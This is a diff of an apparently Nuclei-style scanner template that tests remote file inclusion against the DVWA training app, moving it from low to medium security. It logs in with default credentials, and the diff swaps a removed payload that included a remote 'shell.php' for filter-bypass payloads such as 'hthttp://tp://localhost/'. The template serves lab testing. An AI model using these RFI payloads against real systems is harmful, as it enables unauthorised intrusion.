@@ -1,7 +1,7 @@
-id: web-remote-file-inclusion-simulated-low-sec
+id: web-remote-file-inclusion-simulated-medium-sec
 
 info:
-  name: Web Remote File Inclusion Enumaration Simulated Low Sec (Authenticated)
+  name: Web Remote File Inclusion Enumaration Simulated Medium Sec (Authenticated)
   author: Dylan Shield (Shieldia.co)
   severity: info
   description: Simulates Remote File Inclustion
@@ -10,17 +10,11 @@ info:
 variables:
   password: "password"
   username: "admin"
-  remote_servers:
-    - "http://example.home.arpa/shell.php"
-    - "example.home.arpa"
-    - "127.0.0.1"
 
 flow: |
   http(1) && http(2)
-  for (let remote_server of iterate(template["remote_servers"])) {
-    set("remote_server", remote_server);
-    http(3);
-  }
+  http(3);
+  
 
 http:
   # Step 1: Authenticate as admin and get PHPSESSID and user_token
@@ -49,7 +43,7 @@ http:
           - "name='user_token' value='([a-f0-9]+)'"
         internal: true
 
-  # Step 2: Set Security Level to Low
+  # Step 2: Set Security Level to Medium
   - raw:
       - |
         POST /DVWA/security.php HTTP/1.1
@@ -58,11 +52,27 @@ http:
         Accept: */*
         Connection: close
 
-        security=low&seclev_submit=Submit&user_token={{token}}
+        security=medium&seclev_submit=Submit&user_token={{token}}
 
+  # Step 3: Test the rfi
   - raw:
-      - |
-        GET /DVWA/vulnerabilities/fi/?page={{remote_server}} HTTP/1.1
+    - |
+        GET /DVWA/vulnerabilities/fi/?page=§remote_servers§ HTTP/1.1
         Host: {{Hostname}}
         Accept: */*
         Connection: close
+
+    attack: batteringram
+    payloads:
+      remote_servers:
+        - "hthttp://tp://localhost/"
+        - "localhost.home.arpa"
+        - "127.0.0.1" 
+    matchers:
+      - type: dsl
+        name: "Successful RFI"
+        condition: and
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "Apache2 Ubuntu Default Page")'
+
